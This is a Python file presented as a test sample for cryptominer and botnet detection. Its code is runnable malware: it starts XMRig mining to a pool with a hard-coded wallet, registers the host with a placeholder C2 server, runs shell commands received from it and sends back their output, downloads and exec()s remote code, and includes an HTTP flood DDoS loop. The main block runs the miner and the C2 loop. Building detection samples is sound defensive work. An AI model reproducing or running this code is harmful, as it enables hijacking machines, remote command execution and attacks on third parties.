#!/usr/bin/env python3
"""
Cryptominer & Botnet pattern detection test
Contains indicators of mining malware and C2 communication
"""

import subprocess
import socket
import hashlib
import requests

# CRYPTOMINER PATTERN: Mine cryptocurrency
class Miner:
    def __init__(self):
        self.pool_url = "stratum+tcp://pool.minexmr.com:3333"
        self.wallet = "48W2mPGZaKE2eDSd9CPcb1nBVhxVmxvkKcoLmV8f7gZiV8F1bknhZL6cQu8x9G6Zm2zUpvFzvxXmKwjNg7pWwAa4CXvDRZE"
        self.miner_process = None

    def start_mining(self):
        """Start XMRig mining process"""
        cmd = [
            "xmrig.exe",
            "-o", self.pool_url,
            "-u", self.wallet,
            "-p", "x",
            "--cpu-affinity", "0xFFFFFFFF",
            "--max-cpu-usage", "95"
        ]
        self.miner_process = subprocess.Popen(cmd)

# BOTNET PATTERN: C2 Communication
class BotnetC2:
    def __init__(self):
        self.c2_server = "http://malicious-c2.xyz/api"
        self.bot_id = hashlib.sha256(socket.gethostname().encode()).hexdigest()

    def register_bot(self):
        """Register this machine with C2 server"""
        data = {
            "bot_id": self.bot_id,
            "hostname": socket.gethostname(),
            "os": "Windows 10",
            "cpu_cores": 8,
            "ram": "16GB"
        }
        requests.post(f"{self.c2_server}/register", json=data)

    def receive_commands(self):
        """Receive and execute commands from C2"""
        response = requests.get(f"{self.c2_server}/command?bot_id={self.bot_id}")
        command = response.json().get("cmd")

        if command:
            try:
                result = subprocess.run(command, shell=True, capture_output=True)
                requests.post(
                    f"{self.c2_server}/result",
                    json={"bot_id": self.bot_id, "output": result.stdout.decode()}
                )
            except:
                pass

    def execute_payload(self, url):
        """Download and execute payload from attacker"""
        response = requests.get(url)
        exec(response.text)

# BOTNET PATTERN: DDoS capability
def launch_ddos(target, duration=3600):
    """Launch DDoS attack"""
    import time
    start = time.time()

    while time.time() - start < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, 80))
            sock.sendall(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
            sock.close()
        except:
            pass

if __name__ == "__main__":
    # Start mining
    miner = Miner()
    miner.start_mining()

    # Connect to C2
    botnet = BotnetC2()
    botnet.register_bot()

    # Receive and execute commands indefinitely
    while True:
        botnet.receive_commands()
